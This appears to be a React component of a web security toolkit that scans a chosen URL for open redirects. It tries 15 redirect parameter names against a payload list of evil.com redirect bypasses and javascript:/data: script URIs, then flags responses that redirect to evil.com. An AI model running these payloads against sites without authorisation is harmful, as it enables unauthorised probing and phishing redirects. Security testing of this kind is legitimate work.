import React, { useState } from 'react';
import { parallel } from '../lib/tools.js';

const PAYLOADS = [
  'https://evil.com',
  '//evil.com',
  '/\\evil.com',
  '/%5cevil.com',
  'https:evil.com',
  'https://example.com@evil.com',
  '//google.com%2f@evil.com',
  'javascript:alert(1)',
  'data:text/html,<script>alert(1)</script>',
  '///evil.com',
  '////evil.com',
  '\\\\evil.com',
  'https://evil.com/.example.com',
  'https://example.com.evil.com'
];

const PARAMS = ['url', 'redirect', 'redirect_uri', 'redirect_url', 'next', 'return', 'returnUrl', 'continue', 'goto', 'forward', 'dest', 'destination', 'callback', 'link', 'page'];

export default function OpenRedirect() {
  const [base, setBase] = useState('https://example.com/login');
  const [busy, setBusy] = useState(false);
  const [results, setResults] = useState([]);

  const test = async ({ param, payload }) => {
    const url = base + (base.includes('?') ? '&' : '?') + param + '=' + encodeURIComponent(payload);
    try {
      const ctrl = new AbortController();
      const t = setTimeout(() => ctrl.abort(), 6000);
      const res = await fetch(url, { mode: 'cors', redirect: 'manual', signal: ctrl.signal });
      clearTimeout(t);
      const loc = res.headers.get('location') || '';
      const vulnerable = loc.includes('evil.com') || /^https?:\/\/evil\.com/i.test(loc) || /^\/\/evil\.com/.test(loc);
      return { param, payload, url, status: res.status, location: loc, vulnerable };
    } catch (e) {
      return { param, payload, url, error: e.message };
    }
  };

  const run = async () => {
    setBusy(true); setResults([]);
    const combos = [];
    for (const param of PARAMS) for (const payload of PAYLOADS) combos.push({ param, payload });
    const out = await parallel(combos, test, 6);
    setResults(out);
    setBusy(false);
  };

  const vulns = results.filter(r => r.vulnerable);

  return (
    <>
      <div className="panel">
        <h2>Open Redirect Tester</h2>
        <p style={{color:'var(--muted)',fontSize:13,marginTop:0}}>Tests {PARAMS.length} parameter names × {PAYLOADS.length} payloads = {PARAMS.length * PAYLOADS.length} combinations against the base URL. Detects Location header pointing to evil.com.</p>
        <div className="row">
          <input style={{flex:1}} value={base} onChange={e => setBase(e.target.value)} />
          <button disabled={busy} onClick={run}>{busy ? '…' : 'Test'}</button>
        </div>
      </div>
      {results.length > 0 && (
        <div className="panel">
          <strong>{vulns.length} vulnerable / {results.length} tested</strong>
          {vulns.length === 0 ? <div className="empty">No open redirects found.</div> : (
            <table>
              <thead><tr><th>Param</th><th>Payload</th><th>Status</th><th>Location</th></tr></thead>
              <tbody>{vulns.map((r, i) => (
                <tr key={i}>
                  <td><strong>{r.param}</strong></td>
                  <td><code style={{fontSize:11}}>{r.payload}</code></td>
                  <td>{r.status}</td>
                  <td><code style={{fontSize:11,color:'var(--red)'}}>{r.location}</code></td>
                </tr>
              ))}</tbody>
            </table>
          )}
        </div>
      )}
    </>
  );
}
